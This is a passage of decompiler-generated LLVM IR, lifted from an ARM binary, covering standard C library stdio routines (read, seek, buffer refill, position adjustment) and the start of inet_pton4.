  %v3_17fb0 = inttoptr i32 %v2_17fb0 to i32*
  store i32 %v0_17fb0, i32* %v3_17fb0, align 4
  %v0_17fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fb4 = load i32, i32* @r5, align 4
  %v2_17fb4 = add i32 %v1_17fb4, 24
  %v3_17fb4 = inttoptr i32 %v2_17fb4 to i32*
  store i32 %v0_17fb4, i32* %v3_17fb4, align 4
  %v0_17fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fb8 = load i32, i32* @r5, align 4
  %v2_17fb8 = add i32 %v1_17fb8, 44
  %v3_17fb8 = inttoptr i32 %v2_17fb8 to i32*
  store i32 %v0_17fb8, i32* %v3_17fb8, align 4
  br label %dec_label_pc_17fc4

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17f48, %dec_label_pc_17f74, %dec_label_pc_17f60
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17fc4

dec_label_pc_17fc4:                               ; preds = %dec_label_pc_17f8c, %dec_label_pc_17fc0
  %v0_17fc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fc4 = icmp eq i32 %v0_17fc4, 0
  br i1 %v2_17fc4, label %dec_label_pc_17fc4..thread8_crit_edge, label %bb20

dec_label_pc_17fc4..thread8_crit_edge:            ; preds = %dec_label_pc_17fc4
  %v0_17fdc.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_17fc4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17fd4 = load i32, i32* %r6.global-to-local, align 4
  %v3_17fd4 = add i32 %v1_17fd4, 24
  %v4_17fd4 = inttoptr i32 %v3_17fd4 to i32*
  %v5_17fd4 = load i32, i32* %v4_17fd4, align 4
  store i32 %v5_17fd4, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17fc4..thread8_crit_edge, %bb20
  %v0_17fdc = phi i32 [ %v0_17fdc.pre, %dec_label_pc_17fc4..thread8_crit_edge ], [ %v5_17fd4, %bb20 ]
  %v2_17fdc = xor i1 %v2_17fc4, true
  call void @__pseudo_cond_branch(i1 %v2_17fdc, i32 %v0_17fdc)
  br label %dec_label_pc_17fe0

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_17edc, %.thread8
  %v0_17fe0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17eb4, i32* @r4, align 4
  store i32 %v6_17eb4, i32* @r5, align 4
  store i32 %v12_17eb4, i32* @r7, align 4
  ret i32 %v0_17fe0

; uselistorder directives
  uselistorder i32 %v0_17f74, { 1, 0 }
  uselistorder i32 %v3_17ef0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 56, { 12, 14, 5, 6, 7, 8, 13, 4, 1, 0, 3, 15, 10, 16, 11, 9, 2, 17 }
  uselistorder label %dec_label_pc_17fe0, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17fc4, { 1, 0 }
  uselistorder label %dec_label_pc_17fc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17f74, { 1, 0 }
  uselistorder label %dec_label_pc_17f3c, { 2, 1, 0 }
}

define i32 @function_17ff4(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ff4:
  %v0_17ff4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ff4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17ff4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17ff4, %bb
  %v10_18000 = phi i32 [ %arg1, %dec_label_pc_17ff4 ], [ 0, %bb ]
  ret i32 %v10_18000

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18004 = load i32, i32* @r4, align 4
  store i32 %v3_18004, i32* %stack_var_-12, align 4
  %v0_18008 = load i32, i32* %r0.global-to-local, align 4
  %v1_18008 = inttoptr i32 %v0_18008 to i16*
  %v2_18008 = load i16, i16* %v1_18008, align 2
  %v3_18008 = zext i16 %v2_18008 to i32
  %v1_1800c = and i32 %v3_18008, 4
  store i32 %v1_1800c, i32* %r5.global-to-local, align 4
  %v2_1800c = icmp eq i32 %v1_1800c, 0
  store i32 %v0_18008, i32* %r4.global-to-local, align 4
  br i1 %v2_1800c, label %dec_label_pc_18020, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18020:                               ; preds = %entry
  %v1_18020 = icmp slt i32 %arg2, 0
  br i1 %v1_18020, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18020
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18020, %bb18
  %v1_18028 = add i32 %v0_18008, 4
  %v2_18028 = inttoptr i32 %v1_18028 to i32*
  %v3_18028 = load i32, i32* %v2_18028, align 4
  store i32 %v3_18028, i32* %r0.global-to-local, align 4
  %v1_1802c = call i32 @__GI_read(i32 %v3_18028)
  store i32 %v1_1802c, i32* %r0.global-to-local, align 4
  %v5_18034 = icmp sgt i32 %v1_1802c, 0
  br i1 %v5_18034, label %.thread7, label %dec_label_pc_18038

dec_label_pc_18038:                               ; preds = %bb19
  %v2_18030 = icmp eq i32 %v1_1802c, 0
  %v0_18038 = load i32, i32* %r4.global-to-local, align 4
  %v1_18038 = inttoptr i32 %v0_18038 to i16*
  %v2_18038 = load i16, i16* %v1_18038, align 2
  br i1 %v2_18030, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18038
  %v2_1803c = or i16 %v2_18038, 4
  store i16 %v2_1803c, i16* %v1_18038, align 2
  %v1_18058.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18038
  %v2_18040 = or i16 %v2_18038, 8
  store i16 %v2_18040, i16* %v1_18038, align 2
  %v1_1804c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1804c, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18058 = phi i32 [ %v1_18058.pre, %bb20 ], [ 0, %bb ], [ %v1_1802c, %bb19 ], [ %v1_1804c, %bb21 ]
  %v2_18054 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18054, i32* @r4, align 4
  ret i32 %v1_18058

; uselistorder directives
  uselistorder i16 %v2_18038, { 1, 0 }
  uselistorder i32 %v1_1802c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 2, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1805c = load i32, i32* @r4, align 4
  store i32 %v3_1805c, i32* %stack_var_-12, align 4
  %v3_18060 = load i16, i16* %arg1, align 2
  %v4_18060 = zext i16 %v3_18060 to i32
  store i32 %v4_18060, i32* @ip, align 4
  %tmp17 = urem i16 %v3_18060, 4
  %v1_18064 = zext i16 %tmp17 to i32
  store i32 %v1_18064, i32* %r2.global-to-local, align 4
  %v2_18064 = icmp eq i16 %tmp17, 0
  br i1 %v2_18064, label %bb, label %dec_label_pc_18078

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_18078:                               ; preds = %entry
  %v1_18078 = add nsw i32 %v1_18064, -1
  %v7_18078 = icmp eq i16 %tmp17, 1
  br i1 %v7_18078, label %bb14, label %dec_label_pc_18080

dec_label_pc_18080:                               ; preds = %dec_label_pc_18078
  %v1_18080 = and i32 %v4_18060, 2048
  %v2_18080 = icmp eq i32 %v1_18080, 0
  br i1 %v2_18080, label %bb14, label %dec_label_pc_18088

dec_label_pc_18088:                               ; preds = %dec_label_pc_18080
  %v7_18088 = icmp eq i32 %v1_18078, 2
  br i1 %v7_18088, label %dec_label_pc_1810c, label %dec_label_pc_18090

dec_label_pc_18090:                               ; preds = %dec_label_pc_18088
  %v2_18090 = add i32 %tmp, 40
  %v3_18090 = inttoptr i32 %v2_18090 to i32*
  %v4_18090 = load i32, i32* %v3_18090, align 4
  store i32 %v4_18090, i32* %r3.global-to-local, align 4
  %v2_18094 = icmp eq i32 %v4_18090, 0
  br i1 %v2_18094, label %dec_label_pc_1809c, label %dec_label_pc_1810c

dec_label_pc_1809c:                               ; preds = %dec_label_pc_18090
  %v2_1809c = add i32 %tmp, 44
  %v3_1809c = inttoptr i32 %v2_1809c to i32*
  %v4_1809c = load i32, i32* %v3_1809c, align 4
  store i32 %v4_1809c, i32* %r3.global-to-local, align 4
  %v2_180a0 = add i32 %tmp, 3
  %v3_180a0 = inttoptr i32 %v2_180a0 to i8*
  %v4_180a0 = load i8, i8* %v3_180a0, align 1
  %v5_180a0 = zext i8 %v4_180a0 to i32
  store i32 %v5_180a0, i32* %r2.global-to-local, align 4
  %v2_180a4 = icmp eq i32 %v4_1809c, 0
  br i1 %v2_180a4, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1809c
  %v1_180ac3 = sub nsw i32 0, %v5_180a0
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1809c
  %v3_180a8 = add i32 %tmp, 2
  %v4_180a8 = inttoptr i32 %v3_180a8 to i8*
  %v5_180a8 = load i8, i8* %v4_180a8, align 1
  %v6_180a8 = zext i8 %v5_180a8 to i32
  store i32 %v6_180a8, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_180a8, %v5_180a0
  %v3_180b0 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_18078, %dec_label_pc_18080, %bb13
  %v1_180c4 = phi i32 [ %v1_180ac3, %.thread1 ], [ %v1_18078, %dec_label_pc_18078 ], [ 0, %bb ], [ %v1_18078, %dec_label_pc_18080 ], [ %v3_180b0, %bb13 ]
  %v1_180b4 = and i32 %v4_18060, 64
  %v2_180b4 = icmp eq i32 %v1_180b4, 0
  %v2_180b8 = add i32 %tmp, 16
  %v3_180b8 = inttoptr i32 %v2_180b8 to i32*
  %v4_180b8 = load i32, i32* %v3_180b8, align 4
  store i32 %v4_180b8, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_180b4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_180c4 = sub i32 %v1_180c4, %v4_180b8
  store i32 %v2_180c4, i32* %r3.global-to-local, align 4
  %v1_180c8 = inttoptr i32 %arg2 to i32*
  %v2_180c8 = load i32, i32* %v1_180c8, align 4
  store i32 %v2_180c8, i32* %r0.global-to-local, align 4
  %v3_180c8 = add i32 %arg2, 4
  %v4_180c8 = inttoptr i32 %v3_180c8 to i32*
  %v5_180c8 = load i32, i32* %v4_180c8, align 4
  %v2_180cc = add i32 %storemerge, %v2_180c4
  store i32 %v2_180cc, i32* %r4.global-to-local, align 4
  %v2_180d0 = sub i32 %v2_180c8, %v2_180cc
  store i32 %v2_180d0, i32* %r2.global-to-local, align 4
  %v2_180d4 = and i32 %v2_180cc, 1073741824
  %v3_180d4 = icmp ne i32 %v2_180d4, 0
  %v4_180d4 = ashr i32 %v2_180cc, 31
  %v6_180d4 = icmp eq i1 %v3_180d4, false
  %v7_180d4 = sub i32 %v5_180c8, %v4_180d4
  %v9_180d4 = sext i1 %v6_180d4 to i32
  %v10_180d4 = add i32 %v7_180d4, %v9_180d4
  store i32 %v10_180d4, i32* %r3.global-to-local, align 4
  %v2_180d8 = sub i32 %v10_180d4, %v5_180c8
  %v4_180d8 = xor i32 %v10_180d4, %v5_180c8
  %v5_180d8 = xor i32 %v2_180d8, %v10_180d4
  %v6_180d8 = and i32 %v5_180d8, %v4_180d8
  %v7_180d8 = icmp slt i32 %v6_180d8, 0
  %v8_180d8 = icmp slt i32 %v2_180d8, 0
  %v9_180d8 = icmp eq i32 %v10_180d4, %v5_180c8
  store i32 %v2_180d0, i32* %v1_180c8, align 4
  %v5_180dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_180dc, i32* %v4_180c8, align 4
  %v3_180e0 = xor i1 %v8_180d8, %v7_180d8
  %v4_180e0 = or i1 %v9_180d8, %v3_180e0
  br i1 %v4_180e0, label %dec_label_pc_180e4, label %dec_label_pc_180f0

dec_label_pc_180e4:                               ; preds = %bb14
  br i1 %v9_180d8, label %dec_label_pc_180e8, label %dec_label_pc_180f4thread-pre-split

dec_label_pc_180e8:                               ; preds = %dec_label_pc_180e4
  %v0_180e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_180e8 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_180e8, %v1_180e8
  br i1 %tmp18, label %dec_label_pc_180f0, label %dec_label_pc_180f4thread-pre-split

dec_label_pc_180f0:                               ; preds = %dec_label_pc_180e8, %bb14
  %v0_180f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_180f0 = sub i32 0, %v0_180f0
  store i32 %v1_180f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_180f4

dec_label_pc_180f4thread-pre-split:               ; preds = %dec_label_pc_180e8, %dec_label_pc_180e4
  %v0_180f4.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_180f4

dec_label_pc_180f4:                               ; preds = %dec_label_pc_180f4thread-pre-split, %dec_label_pc_180f0
  %v0_180f4 = phi i32 [ %v0_180f4.pr, %dec_label_pc_180f4thread-pre-split ], [ %v1_180f0, %dec_label_pc_180f0 ]
  %v1_180f4 = icmp slt i32 %v0_180f4, 0
  br i1 %v1_180f4, label %dec_label_pc_180fc, label %dec_label_pc_18110

dec_label_pc_180fc:                               ; preds = %dec_label_pc_180f4
  %v0_180fc = call i32 @__GI___errno_location()
  store i32 %v0_180fc, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_18104 = inttoptr i32 %v0_180fc to i32*
  store i32 75, i32* %v2_18104, align 4
  %v0_18110.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18110

dec_label_pc_1810c:                               ; preds = %dec_label_pc_18090, %dec_label_pc_18088
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18110

dec_label_pc_18110:                               ; preds = %dec_label_pc_180f4, %dec_label_pc_180fc, %dec_label_pc_1810c
  %v0_18110 = phi i32 [ %v0_180f4, %dec_label_pc_180f4 ], [ %v0_18110.pre, %dec_label_pc_180fc ], [ -1, %dec_label_pc_1810c ]
  store i32 %v0_18110, i32* %r0.global-to-local, align 4
  %v2_18118 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18118, i32* @r4, align 4
  ret i32 %v0_18110

; uselistorder directives
  uselistorder i32 %v0_18110, { 1, 0 }
  uselistorder i1 %v9_180d8, { 1, 0 }
  uselistorder i32 %v2_180d8, { 1, 0 }
  uselistorder i32 %v10_180d4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_180c8, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18110, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 3, 2, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18120 = load i32, i32* @r4, align 4
  store i32 %v3_18120, i32* %stack_var_-8, align 4
  %v1_18124 = add i32 %arg1, 8
  %v1_18128 = inttoptr i32 %v1_18124 to i32*
  %v2_18128 = load i32, i32* %v1_18128, align 4
  %v3_18128 = add i32 %arg1, 12
  %v4_18128 = inttoptr i32 %v3_18128 to i32*
  %v5_18128 = load i32, i32* %v4_18128, align 4
  %v2_1812c = sub i32 %v5_18128, %v2_18128
  store i32 %v2_1812c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18134 = inttoptr i32 %arg1 to i16*
  %v4_18134 = call i32 @__stdio_READ(i16* %v3_18134, i32 %v2_18128, i32 %v2_1812c)
  %v0_18138 = load i32, i32* @r4, align 4
  %v1_18138 = add i32 %v0_18138, 8
  %v2_18138 = inttoptr i32 %v1_18138 to i32*
  %v3_18138 = load i32, i32* %v2_18138, align 4
  store i32 %v3_18138, i32* %r2.global-to-local, align 4
  %v2_1813c = add i32 %v3_18138, %v4_18134
  %v2_18140 = add i32 %v0_18138, 20
  %v3_18140 = inttoptr i32 %v2_18140 to i32*
  store i32 %v2_1813c, i32* %v3_18140, align 4
  %v0_18144 = load i32, i32* %r2.global-to-local, align 4
  %v1_18144 = load i32, i32* @r4, align 4
  %v2_18144 = add i32 %v1_18144, 16
  %v3_18144 = inttoptr i32 %v2_18144 to i32*
  store i32 %v0_18144, i32* %v3_18144, align 4
  %v2_18148 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18148, i32* @r4, align 4
  ret i32 %v4_18134

; uselistorder directives
  uselistorder i32 %v4_18134, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18150 = load i32, i32* @r4, align 4
  store i32 %v3_18150, i32* %stack_var_-12, align 4
  %v0_18154 = load i32, i32* @r0, align 4
  %v1_18154 = inttoptr i32 %v0_18154 to i16*
  %v2_18154 = load i16, i16* %v1_18154, align 2
  %v3_18154 = zext i16 %v2_18154 to i32
  store i32 %v3_18154, i32* %r3.global-to-local, align 4
  %v0_18158 = load i32, i32* @r1, align 4
  %v2_18158 = and i32 %v0_18158, %v3_18154
  %v4_18158 = icmp eq i32 %v2_18158, 0
  store i32 %v0_18154, i32* @r4, align 4
  br i1 %v4_18158, label %dec_label_pc_18168, label %dec_label_pc_18178

dec_label_pc_18168:                               ; preds = %entry
  %v1_18168 = and i32 %v3_18154, 2176
  %v2_18168 = icmp eq i32 %v1_18168, 0
  br i1 %v2_18168, label %dec_label_pc_18170, label %dec_label_pc_18184

dec_label_pc_18170:                               ; preds = %dec_label_pc_18168
  %v2_18170 = or i32 %v0_18158, %v3_18154
  store i32 %v2_18170, i32* %r3.global-to-local, align 4
  %v1_18174 = trunc i32 %v2_18170 to i16
  store i16 %v1_18174, i16* %v1_18154, align 2
  %v0_18178.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18178

dec_label_pc_18178:                               ; preds = %entry, %dec_label_pc_18170
  %v0_18178 = phi i32 [ %v0_18154, %entry ], [ %v0_18178.pre, %dec_label_pc_18170 ]
  %v1_18178 = inttoptr i32 %v0_18178 to i16*
  %v2_18178 = load i16, i16* %v1_18178, align 2
  %v3_18178 = zext i16 %v2_18178 to i32
  store i32 %v3_18178, i32* %r3.global-to-local, align 4
  %v1_1817c = and i32 %v3_18178, 16
  store i32 %v1_1817c, i32* %r5.global-to-local, align 4
  %v2_1817c = icmp eq i32 %v1_1817c, 0
  br i1 %v2_1817c, label %dec_label_pc_181a4, label %dec_label_pc_18184

dec_label_pc_18184:                               ; preds = %dec_label_pc_18168, %dec_label_pc_18178
  %v0_18184 = call i32 @__GI___errno_location()
  store i32 %v0_18184, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1818c = inttoptr i32 %v0_18184 to i32*
  store i32 9, i32* %v2_1818c, align 4
  br label %dec_label_pc_18190

dec_label_pc_18190:                               ; preds = %dec_label_pc_181ac, %dec_label_pc_18184
  %v0_18190 = load i32, i32* @r4, align 4
  %v1_18190 = inttoptr i32 %v0_18190 to i16*
  %v2_18190 = load i16, i16* %v1_18190, align 2
  %v3_18190 = zext i16 %v2_18190 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18198 = or i32 %v3_18190, 8
  store i32 %v1_18198, i32* %r3.global-to-local, align 4
  %v1_1819c = trunc i32 %v1_18198 to i16
  store i16 %v1_1819c, i16* %v1_18190, align 2
  %v1_181e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181dc

dec_label_pc_181a4:                               ; preds = %dec_label_pc_18178
  %v1_181a4 = and i32 %v3_18178, 64
  %v2_181a4 = icmp eq i32 %v1_181a4, 0
  br i1 %v2_181a4, label %dec_label_pc_181cc, label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %dec_label_pc_181a4
  %v0_181ac = call i32 @__stdio_wcommit()
  store i32 %v0_181ac, i32* %r0.global-to-local, align 4
  %v2_181b0 = icmp eq i32 %v0_181ac, 0
  br i1 %v2_181b0, label %dec_label_pc_181b8, label %dec_label_pc_18190

dec_label_pc_181b8:                               ; preds = %dec_label_pc_181ac
  %v0_181b8 = load i32, i32* @r4, align 4
  %v1_181b8 = inttoptr i32 %v0_181b8 to i16*
  %v2_181b8 = load i16, i16* %v1_181b8, align 2
  %v3_181b8 = zext i16 %v2_181b8 to i32
  store i32 %v3_181b8, i32* %r3.global-to-local, align 4
  %v1_181bc = add i32 %v0_181b8, 8
  %v2_181bc = inttoptr i32 %v1_181bc to i32*
  %v3_181bc = load i32, i32* %v2_181bc, align 4
  %v1_181c0 = and i32 %v3_181b8, 65471
  store i32 %v1_181c0, i32* %r3.global-to-local, align 4
  %v2_181c4 = add i32 %v0_181b8, 28
  %v3_181c4 = inttoptr i32 %v2_181c4 to i32*
  store i32 %v3_181bc, i32* %v3_181c4, align 4
  %v0_181c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_181c8 = trunc i32 %v0_181c8 to i16
  %v2_181c8 = load i32, i32* @r4, align 4
  %v3_181c8 = inttoptr i32 %v2_181c8 to i16*
  store i16 %v1_181c8, i16* %v3_181c8, align 2
  %v0_181cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181a4, %dec_label_pc_181b8
  %v2_181d4 = phi i32 [ %v0_18178, %dec_label_pc_181a4 ], [ %v0_181cc.pre, %dec_label_pc_181b8 ]
  %v1_181cc = inttoptr i32 %v2_181d4 to i16*
  %v2_181cc = load i16, i16* %v1_181cc, align 2
  %v3_181cc = zext i16 %v2_181cc to i32
  %v1_181d0 = or i32 %v3_181cc, 1
  store i32 %v1_181d0, i32* %r3.global-to-local, align 4
  %v1_181d4 = trunc i32 %v1_181d0 to i16
  store i16 %v1_181d4, i16* %v1_181cc, align 2
  %v0_181d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_181d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %dec_label_pc_18190, %dec_label_pc_181cc
  %v1_181e4 = phi i32 [ %v1_181e4.pre, %dec_label_pc_18190 ], [ %v0_181d8, %dec_label_pc_181cc ]
  %v2_181e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_181e0, i32* @r4, align 4
  ret i32 %v1_181e4

; uselistorder directives
  uselistorder i32 %v3_18154, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_181dc, { 1, 0 }
  uselistorder label %dec_label_pc_181cc, { 1, 0 }
  uselistorder label %dec_label_pc_18184, { 1, 0 }
  uselistorder label %dec_label_pc_18178, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_181f4 = load i32, i32* %arg2, align 4
  %v3_181f4 = add i32 %tmp, 4
  %v4_181f4 = inttoptr i32 %v3_181f4 to i32*
  %v5_181f4 = load i32, i32* %v4_181f4, align 4
  %v1_181f8 = add i32 %arg1, 4
  %v2_181f8 = inttoptr i32 %v1_181f8 to i32*
  %v3_181f8 = load i32, i32* %v2_181f8, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_18200 = call i32 @__GI_lseek64(i32 %v3_181f8, i32 %tmp, i32 %v2_181f4, i32 %v5_181f4)
  %v1_18204 = icmp slt i32* %arg2, null
  br i1 %v1_18204, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1820c5 = load i32, i32* @r4, align 4
  %v4_1820c6 = inttoptr i32 %v3_1820c5 to i32*
  store i32 %v4_18200, i32* %v4_1820c6, align 4
  %v6_1820c7 = add i32 %v3_1820c5, 4
  %v7_1820c8 = inttoptr i32 %v6_1820c7 to i32*
  store i32 %tmp, i32* %v7_1820c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_18200, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18224 = load i32, i32* @r4, align 4
  %v6_18224 = load i32, i32* @r5, align 4
  %v15_18224 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1823c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1823c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_182b41 = load i32, i32* @r0, align 4
  %v1_182b42 = inttoptr i32 %v0_182b41 to i8*
  %v2_182b43 = load i8, i8* %v1_182b42, align 1
  %v3_182b44 = zext i8 %v2_182b43 to i32
  store i32 %v3_182b44, i32* @r3, align 4
  %v2_182b85 = icmp eq i8 %v2_182b43, 0
  store i1 %v2_182b85, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182b85, label %dec_label_pc_182c4, label %dec_label_pc_18254

dec_label_pc_18254:                               ; preds = %entry, %dec_label_pc_182b4.backedge
  %v0_18258 = phi i32 [ %v0_182b4, %dec_label_pc_182b4.backedge ], [ %v0_182b41, %entry ]
  %v0_18290 = phi i32 [ %v3_182b4, %dec_label_pc_182b4.backedge ], [ %v3_182b44, %entry ]
  %v2_18264.in = phi i32 [ %v3_182b4, %dec_label_pc_182b4.backedge ], [ %v3_182b44, %entry ]
  %v2_18264 = add nsw i32 %v2_18264.in, -48
  %v2_18254 = icmp ugt i32 %v2_18264, 8
  %v7_18254 = icmp eq i32 %v2_18264, 9
  store i1 %v7_18254, i1* %cpsr_z.global-to-local, align 1
  %v1_18258 = add i32 %v0_18258, 1
  store i32 %v1_18258, i32* %r0.global-to-local, align 4
  %v2_1825c = xor i1 %v7_18254, true
  %v3_1825c = and i1 %v2_18254, %v2_1825c
  br i1 %v3_1825c, label %dec_label_pc_18290, label %dec_label_pc_18260

dec_label_pc_18260:                               ; preds = %dec_label_pc_18254
  %v0_18260 = load i32, i32* %r1.global-to-local, align 4
  %v1_18260 = inttoptr i32 %v0_18260 to i8*
  %v2_18260 = load i8, i8* %v1_18260, align 1
  %v3_18260 = zext i8 %v2_18260 to i32
  %v0_18264 = load i32, i32* %r7.global-to-local, align 4
  %v3_18264 = mul i32 %v0_18264, %v3_18260
  %v4_18264 = add i32 %v3_18264, %v2_18264
  store i32 %v4_18264, i32* @r3, align 4
  %v2_18268 = icmp ugt i32 %v4_18264, 254
  %v7_18268 = icmp eq i32 %v4_18264, 255
